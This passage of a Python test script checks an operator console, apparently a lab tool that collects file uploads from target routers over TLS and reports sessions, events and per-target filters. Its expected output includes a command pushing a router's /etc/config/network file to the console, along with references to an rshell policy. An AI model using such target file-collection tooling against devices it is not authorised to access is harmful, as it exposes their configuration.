                not sessions_by_state.get("stopped") or
                sessions_by_state["stopped"][0].get("session_id") != uploaded_session_id or
                not sessions_by_exit_reason.get("clean shutdown") or
                sessions_by_exit_reason["clean shutdown"][0].get("session_id") != uploaded_session_id or
                not events_by_session.get(uploaded_session_id) or
                events_by_session[uploaded_session_id][-1].get("event") != "service_stop" or
                not events_by_session_event.get(f"{uploaded_session_id}:upload_complete") or
                not upload_events_by_service_event.get("file-service:upload_complete") or
                upload_events_by_detail_status.get("ok", [{}])[0].get("event") not in ("upload_complete", "connection_close") or
                upload_events_by_detail_operation.get("upload", [{}])[0].get("service") != "file-service" or
                upload_events_by_detail_http_status.get("200", [{}])[0].get("service") != "file-service" or
                upload_events_by_detail_filename.get("evidence.txt", [{}])[0].get("event") not in ("upload_start", "upload_complete", "connection_close") or
                upload_events_by_detail_sha256.get(upload_sha256, [{}])[0].get("event") != "upload_complete" or
                not upload_events_by_event_detail_status.get("upload_complete:ok") or
                not upload_events_by_service_detail_status.get("file-service:ok") or
                not upload_events_by_event_detail_operation.get("upload_complete:upload") or
                not upload_events_by_service_detail_operation.get("file-service:upload") or
                not upload_events_by_event_detail_http_status.get("connection_close:200") or
                not upload_events_by_service_detail_http_status.get("file-service:200") or
                not upload_events_by_event_detail_filename.get("upload_complete:evidence.txt") or
                not upload_events_by_service_detail_filename.get("file-service:evidence.txt") or
                upload_events_by_event_detail_sha256.get(f"upload_complete:{upload_sha256}", [{}])[0].get("details", {}).get("filename") != "evidence.txt" or
                upload_events_by_service_detail_sha256.get(f"file-service:{upload_sha256}", [{}])[0].get("event") != "upload_complete" or
                "events_by_detail_status" not in (upload_events_api.get("indexes") or []) or
                "events_by_detail_operation" not in (upload_events_api.get("indexes") or []) or
                "events_by_detail_http_status" not in (upload_events_api.get("indexes") or []) or
                "events_by_detail_filename" not in (upload_events_api.get("indexes") or []) or
                "events_by_detail_sha256" not in (upload_events_api.get("indexes") or []) or
                "events_by_event_detail_status" not in (upload_events_api.get("indexes") or []) or
                "events_by_service_detail_status" not in (upload_events_api.get("indexes") or []) or
                "events_by_event_detail_operation" not in (upload_events_api.get("indexes") or []) or
                "events_by_service_detail_operation" not in (upload_events_api.get("indexes") or []) or
                "events_by_event_detail_http_status" not in (upload_events_api.get("indexes") or []) or
                "events_by_service_detail_http_status" not in (upload_events_api.get("indexes") or []) or
                "events_by_event_detail_filename" not in (upload_events_api.get("indexes") or []) or
                "events_by_service_detail_filename" not in (upload_events_api.get("indexes") or []) or
                "events_by_event_detail_sha256" not in (upload_events_api.get("indexes") or []) or
                "events_by_service_detail_sha256" not in (upload_events_api.get("indexes") or []) or
                "events_by_detail_target_id" not in (upload_events_api.get("indexes") or []) or
                "events_by_detail_target_label" not in (upload_events_api.get("indexes") or []) or
                "events_by_detail_target_identity_source" not in (upload_events_api.get("indexes") or []) or
                "events_by_detail_target_identity_confidence" not in (upload_events_api.get("indexes") or []) or
                "events_by_event_detail_target_id" not in (upload_events_api.get("indexes") or []) or
                "events_by_service_detail_target_id" not in (upload_events_api.get("indexes") or []) or
                "events_by_event_detail_target_label" not in (upload_events_api.get("indexes") or []) or
                "events_by_service_detail_target_label" not in (upload_events_api.get("indexes") or []) or
                "events_by_event_detail_target_identity_source" not in (upload_events_api.get("indexes") or []) or
                "events_by_service_detail_target_identity_source" not in (upload_events_api.get("indexes") or []) or
                "events_by_event_detail_target_identity_confidence" not in (upload_events_api.get("indexes") or []) or
                "events_by_service_detail_target_identity_confidence" not in (upload_events_api.get("indexes") or []) or
                not upload_remote or
                sessions_by_remote.get(upload_remote, [{}])[0].get("session_id") != uploaded_session_id or
                sessions_by_service_state.get(session_service_state_key, [{}])[0].get("session_id") != uploaded_session_id or
                sessions_by_service_exit_reason.get(session_service_exit_key, [{}])[0].get("session_id") != uploaded_session_id or
                sessions_by_service_remote.get(session_service_remote_key, [{}])[0].get("session_id") != uploaded_session_id or
                sessions_by_target_id.get("target-alpha", [{}])[0].get("session_id") != uploaded_session_id or
                sessions_by_has_uploads.get("yes", [{}])[0].get("session_id") != uploaded_session_id or
                sessions_by_has_fetches.get("no", [{}])[0].get("session_id") != uploaded_session_id or
                sessions_by_has_events.get("yes", [{}])[0].get("session_id") != uploaded_session_id or
                sessions_by_has_session_log.get("yes", [{}])[0].get("session_id") != uploaded_session_id or
                sessions_by_duration_known.get("yes", [{}])[0].get("session_id") != uploaded_session_id or
                sessions_by_metadata_exists.get("yes", [{}])[0].get("session_id") != uploaded_session_id or
                sessions_by_event_log_exists.get("yes", [{}])[0].get("session_id") != uploaded_session_id or
                sessions_by_session_log_exists.get("yes", [{}])[0].get("session_id") != uploaded_session_id or
                upload_summary.get("session_service_state_counts", {}).get(session_service_state_key) != 1 or
                upload_summary.get("session_service_exit_reason_counts", {}).get(session_service_exit_key) != 1 or
                upload_summary.get("session_service_remote_counts", {}).get(session_service_remote_key) != 1 or
                upload_summary.get("session_target_counts", {}).get("target-alpha") != 1 or
                upload_summary.get("session_has_uploads_counts", {}).get("yes") != 1 or
                upload_summary.get("session_has_fetches_counts", {}).get("no") != 1 or
                upload_summary.get("session_has_events_counts", {}).get("yes") != 1 or
                upload_summary.get("session_has_session_log_counts", {}).get("yes") != 1 or
                upload_summary.get("session_duration_known_counts", {}).get("yes") != 1 or
                upload_summary.get("session_metadata_exists_counts", {}).get("yes") != 1 or
                upload_summary.get("session_event_log_exists_counts", {}).get("yes") != 1 or
                upload_summary.get("session_log_exists_counts", {}).get("yes") != 1 or
                "sessions_by_metadata_exists" not in ((upload_doc.get("api_collections") or {}).get("sessions") or {}).get("indexes", []) or
                "sessions_by_target_id" not in ((upload_doc.get("api_collections") or {}).get("sessions") or {}).get("indexes", []) or
                "sessions_by_event_log_exists" not in ((upload_doc.get("api_collections") or {}).get("sessions") or {}).get("indexes", []) or
                "sessions_by_has_session_log" not in ((upload_doc.get("api_collections") or {}).get("sessions") or {}).get("indexes", []) or
                "sessions_by_session_log_exists" not in ((upload_doc.get("api_collections") or {}).get("sessions") or {}).get("indexes", [])):
            print("server json status missing session/event lookup indexes", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        upload_event_stats = upload_doc.get("event_log_stats") or {}
        if (upload_event_stats.get("total_count", 0) < len(global_events) or
                upload_event_stats.get("tail_count") != len(upload_doc.get("events", [])) or
                upload_doc.get("summary", {}).get("event_tail_count") != upload_event_stats.get("tail_count") or
                upload_event_stats.get("by_remote", {}).get(upload_remote, 0) < 1 or
                upload_event_stats.get("by_detail_status", {}).get("ok", 0) < 1 or
                upload_event_stats.get("by_detail_operation", {}).get("upload", 0) < 1 or
                upload_event_stats.get("by_detail_http_status", {}).get("200", 0) < 1 or
                upload_event_stats.get("by_detail_filename", {}).get("evidence.txt", 0) < 1 or
                upload_event_stats.get("by_detail_sha256", {}).get(upload_sha256, 0) < 1 or
                upload_event_stats.get("by_detail_target_id", {}).get("target-alpha", 0) < 1 or
                upload_event_stats.get("by_detail_target_label", {}).get("Alpha Router", 0) < 1 or
                upload_event_stats.get("by_detail_target_identity_source", {}).get("http-header", 0) < 1 or
                upload_event_stats.get("by_detail_target_identity_confidence", {}).get("explicit", 0) < 1 or
                upload_event_stats.get("by_event_detail_status", {}).get("upload_complete:ok", 0) < 1 or
                upload_event_stats.get("by_service_detail_status", {}).get("file-service:ok", 0) < 1 or
                upload_event_stats.get("by_event_detail_sha256", {}).get(f"upload_complete:{upload_sha256}", 0) < 1 or
                upload_event_stats.get("by_service_detail_sha256", {}).get(f"file-service:{upload_sha256}", 0) < 1 or
                upload_event_stats.get("by_event_detail_filename", {}).get("upload_complete:evidence.txt", 0) < 1 or
                upload_event_stats.get("by_service_detail_filename", {}).get("file-service:evidence.txt", 0) < 1 or
                upload_event_stats.get("by_event_detail_target_id", {}).get("upload_complete:target-alpha", 0) < 1 or
                upload_event_stats.get("by_service_detail_target_id", {}).get("file-service:target-alpha", 0) < 1 or
                upload_event_stats.get("by_event_detail_target_label", {}).get("upload_complete:Alpha Router", 0) < 1 or
                upload_event_stats.get("by_service_detail_target_label", {}).get("file-service:Alpha Router", 0) < 1 or
                upload_event_stats.get("by_event_detail_target_identity_source", {}).get("upload_complete:http-header", 0) < 1 or
                upload_event_stats.get("by_service_detail_target_identity_source", {}).get("file-service:http-header", 0) < 1 or
                upload_event_stats.get("by_event_detail_target_identity_confidence", {}).get("upload_complete:explicit", 0) < 1 or
                upload_event_stats.get("by_service_detail_target_identity_confidence", {}).get("file-service:explicit", 0) < 1 or
                upload_doc.get("summary", {}).get("event_remote_counts", {}).get(upload_remote, 0) < 1 or
                upload_doc.get("summary", {}).get("event_detail_status_counts", {}).get("ok", 0) < 1 or
                upload_doc.get("summary", {}).get("event_detail_operation_counts", {}).get("upload", 0) < 1 or
                upload_doc.get("summary", {}).get("event_detail_http_status_counts", {}).get("200", 0) < 1 or
                upload_doc.get("summary", {}).get("event_detail_filename_counts", {}).get("evidence.txt", 0) < 1 or
                upload_doc.get("summary", {}).get("event_detail_sha256_counts", {}).get(upload_sha256, 0) < 1 or
                upload_doc.get("summary", {}).get("event_detail_target_id_counts", {}).get("target-alpha", 0) < 1 or
                upload_doc.get("summary", {}).get("event_detail_target_label_counts", {}).get("Alpha Router", 0) < 1 or
                upload_doc.get("summary", {}).get("event_detail_target_identity_source_counts", {}).get("http-header", 0) < 1 or
                upload_doc.get("summary", {}).get("event_detail_target_identity_confidence_counts", {}).get("explicit", 0) < 1 or
                upload_doc.get("summary", {}).get("event_type_detail_status_counts", {}).get("upload_complete:ok", 0) < 1 or
                upload_doc.get("summary", {}).get("event_service_detail_status_counts", {}).get("file-service:ok", 0) < 1 or
                upload_doc.get("summary", {}).get("event_type_detail_sha256_counts", {}).get(f"upload_complete:{upload_sha256}", 0) < 1 or
                upload_doc.get("summary", {}).get("event_service_detail_sha256_counts", {}).get(f"file-service:{upload_sha256}", 0) < 1 or
                upload_doc.get("summary", {}).get("event_type_detail_filename_counts", {}).get("upload_complete:evidence.txt", 0) < 1 or
                upload_doc.get("summary", {}).get("event_service_detail_filename_counts", {}).get("file-service:evidence.txt", 0) < 1 or
                upload_doc.get("summary", {}).get("event_type_detail_target_id_counts", {}).get("upload_complete:target-alpha", 0) < 1 or
                upload_doc.get("summary", {}).get("event_service_detail_target_id_counts", {}).get("file-service:target-alpha", 0) < 1 or
                upload_doc.get("summary", {}).get("event_type_detail_target_label_counts", {}).get("upload_complete:Alpha Router", 0) < 1 or
                upload_doc.get("summary", {}).get("event_service_detail_target_label_counts", {}).get("file-service:Alpha Router", 0) < 1 or
                upload_doc.get("summary", {}).get("event_type_detail_target_identity_source_counts", {}).get("upload_complete:http-header", 0) < 1 or
                upload_doc.get("summary", {}).get("event_service_detail_target_identity_source_counts", {}).get("file-service:http-header", 0) < 1 or
                upload_doc.get("summary", {}).get("event_type_detail_target_identity_confidence_counts", {}).get("upload_complete:explicit", 0) < 1 or
                upload_doc.get("summary", {}).get("event_service_detail_target_identity_confidence_counts", {}).get("file-service:explicit", 0) < 1):
            print("server json status missing upload event log stats", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        if (not (upload_doc.get("events_by_level") or {}).get("info") or
                not (upload_doc.get("events_by_remote") or {}).get(upload_remote)):
            print("server json status missing upload event lookup index", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        upload_status_text = run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--status",
        )
        if ("Event log:" not in upload_status_text.stdout or
                "file-service:upload_complete" not in upload_status_text.stdout or
                "services: file-service=" not in upload_status_text.stdout or
                "levels: info=" not in upload_status_text.stdout or
                "remotes:" not in upload_status_text.stdout or
                "detail_statuses: ok=" not in upload_status_text.stdout or
                "detail_operations: upload=" not in upload_status_text.stdout or
                "detail_http_statuses: 200=" not in upload_status_text.stdout or
                f"detail_sha256: {upload_sha256}=" not in upload_status_text.stdout or
                f"operation=upload status=ok filename=evidence.txt sha256={upload_sha256}" not in upload_status_text.stdout or
                "operation=upload status=ok http=200 filename=evidence.txt" not in upload_status_text.stdout or
                "Command queue:" not in upload_status_text.stdout or
                "active_control_channel=no" not in upload_status_text.stdout or
                "arbitrary_execution_allowed=no" not in upload_status_text.stdout or
                "policy_flags: operator_queue_records_only=yes metadata_only_default=yes safe_disabled_default=yes" not in upload_status_text.stdout or
                "transport_support: poll=no live_polling=no" not in upload_status_text.stdout or
                "execution_supported=no delivery_supported=no result_upload_supported=yes" not in upload_status_text.stdout or
                "Generated target commands:" not in upload_status_text.stdout or
                "Target command summary:" not in upload_status_text.stdout or
                "operator_supplied_execution=0" not in upload_status_text.stdout or
                "executes_operator_supplied_commands=no" not in upload_status_text.stdout or
                "all_require_explicit_target_action=yes" not in upload_status_text.stdout or
                "rshell policy validity: True=1" not in upload_status_text.stdout or
                "rshell policy errors: 0" not in upload_status_text.stdout or
                "./grit reality-test push" not in upload_status_text.stdout or
                "Activity summary:" not in upload_status_text.stdout or
                "session durations:" not in upload_status_text.stdout or
                "uploads=1" not in upload_status_text.stdout or
                "targets=1" not in upload_status_text.stdout or
                "Targets:" not in upload_status_text.stdout or
                "target-alpha label=Alpha Router confidence=explicit" not in upload_status_text.stdout or
                "target: target-alpha label=Alpha Router confidence=explicit" not in upload_status_text.stdout or
                "stored_exists=True" not in upload_status_text.stdout or
                f"upload={upload_item.get('timestamp')}" not in upload_status_text.stdout or
                f"remote: {upload_remote} at {upload_item.get('timestamp')}" not in upload_status_text.stdout or
                "session:" not in upload_status_text.stdout or
                "duration_sec=" not in upload_status_text.stdout or
                "metadata:" not in upload_status_text.stdout or
                "event_log:" not in upload_status_text.stdout):
            print("text --status missing event log or command queue section", file=sys.stderr)
            print(upload_status_text.stdout, file=sys.stderr)
            return 1

        state_file = Path(tmp) / "operator-session" / "server-state.json"
        staged_file = Path(tmp) / "operator-session" / "staged-files.json"
        uploads_view = run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--state-file", str(state_file),
            "--staged-file", str(staged_file),
        )
        if ("Received uploads" not in uploads_view.stdout or
                "evidence.txt" not in uploads_view.stdout or
                "metadata:" not in uploads_view.stdout or
                "Generated target commands" not in uploads_view.stdout or
                "Operator paths:" not in uploads_view.stdout or
                "Service summary:" not in uploads_view.stdout or
                "Workbench mode: noninteractive" not in uploads_view.stdout or
                "Activity summary:" not in uploads_view.stdout or
                "Path health:" not in uploads_view.stdout or
                "Targets:" not in uploads_view.stdout or
                "target-alpha label=Alpha Router confidence=explicit" not in uploads_view.stdout or
                "target: target-alpha label=Alpha Router confidence=explicit" not in uploads_view.stdout or
                "state_file: exists=" not in uploads_view.stdout or
                "event_log:" not in uploads_view.stdout or
                "tls_cert:" not in uploads_view.stdout or
                "Event log" not in uploads_view.stdout or
                "detail_statuses: ok=" not in uploads_view.stdout or
                "detail_operations: upload=" not in uploads_view.stdout or
                "detail_http_statuses: 200=" not in uploads_view.stdout or
                "uploads=1" not in uploads_view.stdout or
                "targets=1" not in uploads_view.stdout or
                "active_control_channel=no" not in uploads_view.stdout or
                "arbitrary_execution_allowed=no" not in uploads_view.stdout or
                "policy_flags: operator_queue_records_only=yes metadata_only_default=yes safe_disabled_default=yes" not in uploads_view.stdout or
                "transport_support: poll=no live_polling=no" not in uploads_view.stdout or
                "execution_supported=no delivery_supported=no result_upload_supported=yes" not in uploads_view.stdout or
                "Target command summary:" not in uploads_view.stdout or
                "operator_supplied_execution=0" not in uploads_view.stdout or
                "executes_operator_supplied_commands=no" not in uploads_view.stdout or
                "all_require_explicit_target_action=yes" not in uploads_view.stdout or
                "rshell policy validity: True=1" not in uploads_view.stdout or
                "rshell policy errors: 0" not in uploads_view.stdout or
                f"upload={upload_item.get('timestamp')}" not in uploads_view.stdout or
                "stored_exists: True" not in uploads_view.stdout or
                "session:" not in uploads_view.stdout or
                "./grit put /etc/config/network" not in uploads_view.stdout or
                "./grit reality-test push" not in uploads_view.stdout or
                "./grit evidence push" not in uploads_view.stdout):
            print("workbench did not show received upload metadata", file=sys.stderr)
            print(uploads_view.stdout, file=sys.stderr)
            return 1
        uploads_view_state = json.loads(state_file.read_text(encoding="utf-8"))
        if uploads_view_state.get("services", {}).get("workbench", {}).get("workbench_mode") != "noninteractive":
            print("noninteractive workbench did not persist workbench mode", file=sys.stderr)
            print(json.dumps(uploads_view_state, indent=2), file=sys.stderr)
            return 1

        label_update = run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--set-target-label", "target-alpha",
            "--target-label", "Alpha Router Renamed",
            "--target-alias", "rack-1",
            "--target-notes", "primary lab router",
        )
        if (label_update.returncode != 0 or
                "Alpha Router Renamed" not in label_update.stdout or
                "notes=primary lab router" not in label_update.stdout):
            print("target label update failed", file=sys.stderr)
            print(label_update.stdout, file=sys.stderr)
            print(label_update.stderr, file=sys.stderr)
            return 1
        label_events = [json.loads(line) for line in global_events_path.read_text(encoding="utf-8").splitlines()]
        upload_complete_events = [
            event for event in label_events
            if event.get("event") == "upload_complete"
        ]
        if not upload_complete_events or upload_complete_events[-1].get("details", {}).get("target_label") != "Alpha Router":
            print("target label update rewrote immutable upload event history", file=sys.stderr)
            return 1

        proc2 = subprocess.Popen(
            [
                str(server),
                "--config", str(upload_cfg),
                "--file-service",
                "--one-shot",
                "--timeout", "5",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        payload2 = b"grit evidence two\n"
        request2 = (
            "PUT /upload/evidence-bravo.txt HTTP/1.1\r\n"
            "Host: 127.0.0.1\r\n"
            "X-Grit-Source-Path: /tmp/evidence-bravo.txt\r\n"
            "X-Grit-Upload-Kind: evidence\r\n"
            "X-Grit-Target-Id: target-bravo\r\n"
            "X-Grit-Target-Label: Bravo Router\r\n"
            "X-Grit-Target-Alias: lab-bravo\r\n"
            f"Content-Length: {len(payload2)}\r\n"
            "\r\n"
        ).encode("ascii") + payload2
        response2 = b""
        deadline = time.time() + 5
        while time.time() < deadline:
            try:
                with socket.create_connection(("127.0.0.1", upload_port), timeout=0.5) as raw:
                    with context.wrap_socket(raw, server_hostname="grit") as tls:
                        tls.sendall(request2)
                        while True:
                            chunk = tls.recv(65536)
                            if not chunk:
                                break
                            response2 += chunk
                break
            except (ConnectionRefusedError, TimeoutError, OSError):
                time.sleep(0.05)
        stdout2, stderr2 = proc2.communicate(timeout=5)
        if proc2.returncode != 0 or b"HTTP/1.1 200 OK" not in response2:
            print("second target upload failed:", file=sys.stderr)
            print(stdout2, file=sys.stderr)
            print(stderr2, file=sys.stderr)
            print(response2.decode("utf-8", errors="replace"), file=sys.stderr)
            return 1
        multi_target_doc = json.loads(run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--json-status",
        ).stdout)
        multi_target_registry = (multi_target_doc.get("target_registry_state_records_by_id") or {}).get("target-registry") or {}
        if (multi_target_doc.get("summary", {}).get("target_count") != 2 or
                multi_target_registry.get("target_count") != 2 or
                multi_target_registry.get("unfiltered_target_count") != 2 or
                multi_target_registry.get("has_targets") is not True or
                multi_target_registry.get("filter_active") is not False or
                multi_target_registry.get("selected_target_found") is not False or
                multi_target_registry.get("has_identity_sources") is not True or
                multi_target_registry.get("has_latest_activity") is not True or
                multi_target_registry.get("identity_confidence_counts", {}).get("explicit") != 2 or
                multi_target_registry.get("latest_activity_service_counts", {}).get("file-service") != 2 or
                multi_target_doc.get("summary", {}).get("target_registry_state_record_count") != 1 or
                multi_target_doc.get("summary", {}).get("target_registry_has_targets") is not True or
                multi_target_doc.get("summary", {}).get("target_registry_has_identity_sources") is not True or
                multi_target_doc.get("target_registry_state_records_by_has_targets", {}).get("True", [{}])[0].get("id") != "target-registry" or
                "target_registry_state_records_by_selected_target_found" not in ((multi_target_doc.get("api_collections") or {}).get("target_registry_state_records") or {}).get("indexes", []) or
                multi_target_doc.get("summary", {}).get("upload_target_counts", {}).get("target-alpha") != 1 or
                multi_target_doc.get("summary", {}).get("upload_target_counts", {}).get("target-bravo") != 1 or
                (multi_target_doc.get("targets_by_id") or {}).get("target-alpha", {}).get("label") != "Alpha Router Renamed" or
                (multi_target_doc.get("targets_by_id") or {}).get("target-alpha", {}).get("notes") != "primary lab router" or
                (multi_target_doc.get("targets_by_id") or {}).get("target-bravo", {}).get("label") != "Bravo Router" or
                "lab-bravo" not in ((multi_target_doc.get("targets_by_id") or {}).get("target-bravo", {}).get("aliases") or []) or
                multi_target_doc.get("summary", {}).get("target_notes_count") != 1 or
                multi_target_doc.get("summary", {}).get("target_without_notes_count") != 1 or
                ((multi_target_doc.get("targets_by_has_notes") or {}).get("yes") or [{}])[0].get("target_id") != "target-alpha" or
                "targets_by_has_notes" not in ((multi_target_doc.get("api_collections") or {}).get("targets") or {}).get("indexes", []) or
                len((multi_target_doc.get("uploads_by_target_id") or {}).get("target-alpha") or []) != 1 or
                len((multi_target_doc.get("uploads_by_target_id") or {}).get("target-bravo") or []) != 1):
            print("two uploads from distinct target ids did not remain separate", file=sys.stderr)
            print(json.dumps(multi_target_doc, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        filtered_alpha = json.loads(run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--target-id", "target-alpha",
            "--json-status",
        ).stdout)
        filtered_alpha_registry = (filtered_alpha.get("target_registry_state_records_by_id") or {}).get("target-registry") or {}
        filtered_alpha_record = (filtered_alpha.get("target_filter_records_by_target_id") or {}).get("target-alpha", [{}])[0]
        filtered_alpha_target = (filtered_alpha.get("targets_by_id") or {}).get("target-alpha", {})
        if (filtered_alpha.get("target_filter", {}).get("target_id") != "target-alpha" or
                filtered_alpha.get("target_filter", {}).get("active") is not True or
                filtered_alpha_registry.get("target_count") != 1 or
                filtered_alpha_registry.get("unfiltered_target_count") != 2 or
                filtered_alpha_registry.get("filter_active") is not True or
                filtered_alpha_registry.get("filter_target_id") != "target-alpha" or
                filtered_alpha_registry.get("selected_target_found") is not True or
                filtered_alpha_registry.get("selected_target_label") != "Alpha Router Renamed" or
                filtered_alpha_registry.get("selected_target_identity_confidence") != "explicit" or
                filtered_alpha_registry.get("selected_target_offline_age_bucket") != filtered_alpha_target.get("offline_age_bucket") or
                filtered_alpha_registry.get("selected_target_offline_for_sec") != filtered_alpha_target.get("offline_for_sec") or
                filtered_alpha_registry.get("selected_target_notes_present") is not True or
                filtered_alpha_registry.get("selected_target_latest_file_transfer_operation") != "upload" or
                filtered_alpha_registry.get("selected_target_latest_file_transfer_status") != "ok" or
                filtered_alpha_registry.get("selected_target_latest_file_transfer_route_kind") != "direct" or
                filtered_alpha.get("target_registry_state_records_by_filter_active", {}).get("True", [{}])[0].get("id") != "target-registry" or
                filtered_alpha.get("target_registry_state_records_by_selected_target_latest_file_transfer_route_kind", {}).get("direct", [{}])[0].get("id") != "target-registry" or
                filtered_alpha.get("summary", {}).get("target_registry_has_selected_target") is not True or
                filtered_alpha.get("target_filter", {}).get("selected_target_found") is not True or
                filtered_alpha.get("target_filter", {}).get("selected_target_label") != "Alpha Router Renamed" or
                filtered_alpha.get("target_filter", {}).get("selected_target_identity_confidence") != "explicit" or
                filtered_alpha.get("target_filter", {}).get("selected_target_connectivity_state") != "online" or
                filtered_alpha.get("target_filter", {}).get("selected_target_offline_age_bucket") != filtered_alpha_target.get("offline_age_bucket") or
                filtered_alpha.get("target_filter", {}).get("selected_target_offline_for_sec") != filtered_alpha_target.get("offline_for_sec") or
                filtered_alpha.get("target_filter", {}).get("selected_target_mailbox_pending_work_count") != 0 or
                filtered_alpha.get("target_filter", {}).get("selected_target_poll_overdue") is not False or
                filtered_alpha.get("target_filter", {}).get("selected_target_latest_file_transfer_operation") != "upload" or
                filtered_alpha.get("target_filter", {}).get("selected_target_latest_file_transfer_status") != "ok" or
                filtered_alpha.get("target_filter", {}).get("selected_target_latest_file_transfer_route_kind") != "direct" or
                "http-header" not in (filtered_alpha.get("target_filter", {}).get("selected_target_identity_sources") or []) or
                "lab-alpha" not in (filtered_alpha.get("target_filter", {}).get("selected_target_aliases") or []) or
                "rack-1" not in (filtered_alpha.get("target_filter", {}).get("selected_target_aliases") or []) or
                filtered_alpha.get("target_filter", {}).get("selected_target_notes_present") is not True or
                filtered_alpha.get("target_filter", {}).get("selected_target", {}).get("notes") != "primary lab router" or
                filtered_alpha.get("api", {}).get("target_filter_selected_target_found") is not True or
                filtered_alpha.get("api", {}).get("target_filter_selected_target_label") != "Alpha Router Renamed" or
                filtered_alpha.get("api", {}).get("target_filter_selected_target_identity_confidence") != "explicit" or
                filtered_alpha.get("api", {}).get("target_filter_selected_target_connectivity_state") != "online" or
                filtered_alpha.get("api", {}).get("target_filter_selected_target_offline_age_bucket") != filtered_alpha_target.get("offline_age_bucket") or
                filtered_alpha.get("api", {}).get("target_filter_selected_target_offline_for_sec") != filtered_alpha_target.get("offline_for_sec") or
                filtered_alpha.get("api", {}).get("target_filter_selected_target_mailbox_pending_work_count") != 0 or
                filtered_alpha.get("api", {}).get("target_filter_selected_target_poll_overdue") is not False or
                filtered_alpha.get("api", {}).get("target_filter_selected_target_latest_file_transfer_status") != "ok" or
                filtered_alpha.get("api", {}).get("target_filter_selected_target_latest_file_transfer_route_kind") != "direct" or
                filtered_alpha.get("target_filter", {}).get("unfiltered_counts", {}).get("targets") != 2 or
                filtered_alpha.get("summary", {}).get("target_count") != 1 or
                filtered_alpha.get("summary", {}).get("upload_count") != 1 or
                filtered_alpha.get("summary", {}).get("target_filter_unfiltered_upload_count") != 2 or
                filtered_alpha.get("summary", {}).get("upload_target_counts", {}).get("target-alpha") != 1 or
                filtered_alpha.get("summary", {}).get("event_detail_target_id_counts", {}).get("target-alpha", 0) < 1 or
                "target-bravo" in filtered_alpha.get("summary", {}).get("event_detail_target_id_counts", {}) or
                filtered_alpha.get("summary", {}).get("event_count") != len(filtered_alpha.get("events") or []) or
                filtered_alpha.get("target_filter", {}).get("filtered_counts", {}).get("events") != len(filtered_alpha.get("events") or []) or
                (filtered_alpha.get("events_by_detail_target_id") or {}).get("target-bravo") or
                "target-bravo" in (filtered_alpha.get("targets_by_id") or {}) or
                (filtered_alpha.get("targets_by_id") or {}).get("target-alpha", {}).get("label") != "Alpha Router Renamed" or
                (filtered_alpha.get("targets_by_id") or {}).get("target-alpha", {}).get("notes") != "primary lab router" or
                filtered_alpha.get("summary", {}).get("target_notes_count") != 1 or
                filtered_alpha.get("summary", {}).get("target_filter_record_count") != 1 or
                filtered_alpha.get("summary", {}).get("target_filter_selected_target_found") is not True or
                filtered_alpha.get("summary", {}).get("target_filter_selected_target_identity_source_count") < 1 or
                filtered_alpha_record.get("selected_target_label") != "Alpha Router Renamed" or
                filtered_alpha_record.get("selected_target_connectivity_state") != "online" or
                filtered_alpha_record.get("selected_target_offline_age_bucket") != filtered_alpha_target.get("offline_age_bucket") or
                filtered_alpha_record.get("selected_target_offline_for_sec") != filtered_alpha_target.get("offline_for_sec") or
                filtered_alpha_record.get("selected_target_mailbox_pending_work_count") != 0 or
                filtered_alpha_record.get("selected_target_poll_overdue") is not False or
                filtered_alpha_record.get("selected_target_latest_file_transfer_operation") != "upload" or
                filtered_alpha_record.get("selected_target_latest_file_transfer_status") != "ok" or
                filtered_alpha_record.get("selected_target_latest_file_transfer_route_kind") != "direct" or
                filtered_alpha_record.get("unfiltered_target_count") != 2 or
                filtered_alpha_record.get("filtered_target_count") != 1 or
                filtered_alpha_record.get("unfiltered_upload_count") != 2 or
                filtered_alpha_record.get("filtered_upload_count") != 1 or
                filtered_alpha_record.get("has_unfiltered_activity") is not True or
                filtered_alpha_record.get("has_filtered_activity") is not True or
                filtered_alpha_record.get("filter_reduced_activity") is not True or
                filtered_alpha_record.get("unfiltered_observed_activity_count", 0) <= filtered_alpha_record.get("filtered_observed_activity_count", 0) or
                filtered_alpha_record.get("has_unfiltered_observed_activity") is not True or
                filtered_alpha_record.get("has_filtered_observed_activity") is not True or
                filtered_alpha_record.get("filter_reduced_observed_activity") is not True or
                filtered_alpha.get("target_filter", {}).get("observed_activity_counts", {}).get("filtered") != filtered_alpha_record.get("filtered_observed_activity_count") or
                filtered_alpha.get("summary", {}).get("target_filter_unfiltered_observed_activity_count") != filtered_alpha_record.get("unfiltered_observed_activity_count") or
                filtered_alpha.get("summary", {}).get("target_filter_observed_activity_count") != filtered_alpha_record.get("filtered_observed_activity_count") or
                filtered_alpha.get("summary", {}).get("target_filter_has_unfiltered_observed_activity") is not True or
                filtered_alpha.get("summary", {}).get("target_filter_has_observed_activity") is not True or
                filtered_alpha.get("summary", {}).get("target_filter_reduced_observed_activity") is not True or
                (filtered_alpha.get("target_filter_records_by_selected_target_found") or {}).get("True", [{}])[0].get("target_id") != "target-alpha" or
                (filtered_alpha.get("target_filter_records_by_selected_target_latest_file_transfer_route_kind") or {}).get("direct", [{}])[0].get("target_id") != "target-alpha" or
                "target_filter_records_by_selected_target_identity_confidence" not in ((filtered_alpha.get("api_collections") or {}).get("target_filter_records") or {}).get("indexes", []) or
                "target_filter_records_by_selected_target_connectivity_state" not in ((filtered_alpha.get("api_collections") or {}).get("target_filter_records") or {}).get("indexes", []) or
                "target_filter_records_by_selected_target_offline_age_bucket" not in ((filtered_alpha.get("api_collections") or {}).get("target_filter_records") or {}).get("indexes", []) or
                "target_filter_records_by_selected_target_mailbox_pending_work_count" not in ((filtered_alpha.get("api_collections") or {}).get("target_filter_records") or {}).get("indexes", []) or
                "target_filter_records_by_selected_target_latest_file_transfer_route_kind" not in ((filtered_alpha.get("api_collections") or {}).get("target_filter_records") or {}).get("indexes", []) or
                "target_registry_state_records_by_selected_target_connectivity_state" not in ((filtered_alpha.get("api_collections") or {}).get("target_registry_state_records") or {}).get("indexes", []) or
